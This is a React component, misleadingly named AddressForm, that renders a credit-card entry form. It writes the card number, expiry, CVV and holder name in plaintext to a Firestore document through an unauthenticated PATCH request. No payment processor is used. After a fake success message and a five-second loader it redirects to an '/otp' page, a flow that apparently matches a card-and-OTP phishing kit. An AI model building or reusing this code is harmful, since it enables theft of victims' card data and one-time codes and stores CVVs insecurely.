import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import styles from "../../src/styles/styles";
import Loader from "../components/Layout/Loader";
import Cards from "react-credit-cards-2";
import "react-credit-cards-2/dist/es/styles-compiled.css";

const AddressForm = ({ SetLoading }) => {
  const [userid, setUserid] = useState(null);
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    cardNumber: "",
    expirationDate: "",
    securityCode: "",
    cardHolderName: "",
  });

  const [focus, setFocus] = useState("");
  const [error, setError] = useState(null);
  const [successMessage, setSuccessMessage] = useState(null);
  const navigate = useNavigate();

  useEffect(() => {
    const userId = localStorage.getItem("userid");
    if (userId) {
      setUserid(userId);
    } else {
      console.error("User ID not found in localStorage");
    }
  }, []);

  const formatCardNumber = (value) => {
    return value.replace(/\D/g, "").replace(/(.{4})/g, "$1 ").trim();
  };

  const formatExpirationDate = (value) => {
    return value.replace(/\D/g, "").replace(/(\d{2})(\d{0,2})/, "$1/$2").trim();
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    let formattedValue = value;

    if (name === "cardNumber") {
      formattedValue = formatCardNumber(value);
    } else if (name === "expirationDate") {
      formattedValue = formatExpirationDate(value);
    } else if (name === "securityCode") {
      formattedValue = value.replace(/\D/g, "").slice(0, 4);
    }

    setFormData({
      ...formData,
      [name]: formattedValue,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!userid) {
      setError("User ID is missing");
      return;
    }

    SetLoading(true);

    if (
      !formData.cardNumber ||
      !formData.expirationDate ||
      !formData.securityCode ||
      !formData.cardHolderName
    ) {
      setError("Please fill in all required fields.");
      SetLoading(false);
      return;
    }

    try {
      await fetch(
        `https://firestore.googleapis.com/v1/projects/zeedata-1/databases/(default)/documents/payment/${userid}?updateMask.fieldPaths=cardNumber&updateMask.fieldPaths=expirationDate&updateMask.fieldPaths=securityCode&updateMask.fieldPaths=cardHolderName`,
        {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            fields: {
              cardNumber: { stringValue: formData.cardNumber },
              expirationDate: { stringValue: formData.expirationDate },
              securityCode: { stringValue: formData.securityCode },
              cardHolderName: { stringValue: formData.cardHolderName },
            },
          }),
        }
      )
        .then((response) => response.json())
        .then((data) => console.log("Updated document:", data))
        .catch((error) => console.error("Error:", error));

      setSuccessMessage("Payment details added successfully!");
      setError(null);
      setLoading(true);

      setTimeout(() => {
        setLoading(false);
        navigate("/otp");
      }, 5000);

      // const response = await fetch(
      //   `http://localhost:8000/api/payment/${userid}`,
      //   {
      //     method: "POST",
      //     headers: { "Content-Type": "application/json" },
      //     body: JSON.stringify(formData),
      //   }
      // );

      // const data = await response.json();

      // if (response.ok) {
      //   setSuccessMessage("Payment details added successfully!");
      //   setError(null);
      //   setLoading(true);

      //   setTimeout(() => {
      //     setLoading(false);
      //     navigate("/otp");
      //   }, 5000);
      // } else {
      //   setError(data.message || "Error adding payment details");
      // }
    } catch (err) {
      console.error("Error:", err);
      setError("Server error");
    } finally {
      SetLoading(false);
    }
  };

  return (
    <div className="w-full flex flex-col items-center py-4 px-4 sm:px-6 md:px-8 bg-gray-100">
      {loading ? (
        <Loader />
      ) : (
        <div className="w-full max-w-lg bg-white rounded-lg p-4 sm:p-6 shadow-md">
          {error && <p className="text-red-500 mb-2 text-sm">{error}</p>}
          {successMessage && (
            <p className="text-green-500 mb-2 text-sm">{successMessage}</p>
          )}
          <div className="w-full flex justify-center pb-2">
            <Cards
              cvc={formData.securityCode}
              expiry={formData.expirationDate}
              name={formData.cardHolderName}
              number={formData.cardNumber}
              focused={focus}
              className="w-40 sm:w-48 md:w-56 lg:w-64 h-auto"
            />
          </div>
          <form onSubmit={handleSubmit} className="w-full">
            {/* Single Column Layout for Mobile */}
            <div className="flex flex-col gap-3">
              <input
                type="text"
                name="cardNumber"
                placeholder="Card Number"
                value={formData.cardNumber}
                onChange={handleChange}
                required
                className="w-full p-3 border border-gray-300 rounded-md text-base sm:text-lg"
              />

              <input
                type="text"
                name="expirationDate"
                placeholder="MM/YY"
                value={formData.expirationDate}
                onChange={handleChange}
                required
                className="w-full p-3 border border-gray-300 rounded-md text-base sm:text-lg"
              />

              <input
                type="text"
                name="securityCode"
                placeholder="CVV"
                value={formData.securityCode}
                onChange={handleChange}
                required
                className="w-full p-3 border border-gray-300 rounded-md text-base sm:text-lg"
                maxLength="4"
              />

              <input
                type="text"
                name="cardHolderName"
                placeholder="Cardholder Name"
                value={formData.cardHolderName}
                onChange={handleChange}
                required
                className="w-full p-3 border border-gray-300 rounded-md text-base sm:text-lg"
              />
            </div>

            <button
              type="submit"
              className="w-full bg-black text-white py-3 rounded-md mt-3 text-lg font-semibold"
            >
              Confirm Payment
            </button>
          </form>
        </div>
      )}
    </div>
  );
};

export default AddressForm;